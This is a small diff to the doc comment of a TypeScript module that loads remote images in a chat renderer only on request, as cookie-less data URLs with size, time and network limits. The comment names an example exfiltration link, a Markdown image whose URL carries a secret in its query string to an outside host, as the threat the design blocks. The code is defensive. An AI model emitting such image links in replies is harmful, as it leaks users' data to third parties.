@@ -1,10 +1,12 @@
 /**
  * An image a reply links to on another host, fetched once the person asks
  * (Markdown's "Load image from <host>"). The renderer's CSP allows no remote
- * image, so a reply such as `![x](https://host/?d=secret)` tells that host
- * nothing until then, and this is the only way one reaches the page: as a
- * data URL, fetched without cookies or a referrer, image types only, at most
- * 10 MB, within 15 seconds, and never from this computer or its network.
+ * image but Haarness Cloud's own marketplace icons, and Markdown loads no
+ * remote image by itself, so a reply such as `![x](https://host/?d=secret)`
+ * tells that host nothing until then, and this is the only way one reaches
+ * the page: as a data URL, fetched without cookies or a referrer, image types
+ * only, at most 10 MB, within 15 seconds, and never from this computer or its
+ * network.
  */
 import { lookup } from "node:dns";
 import { request as httpRequest, type IncomingMessage } from "node:http";
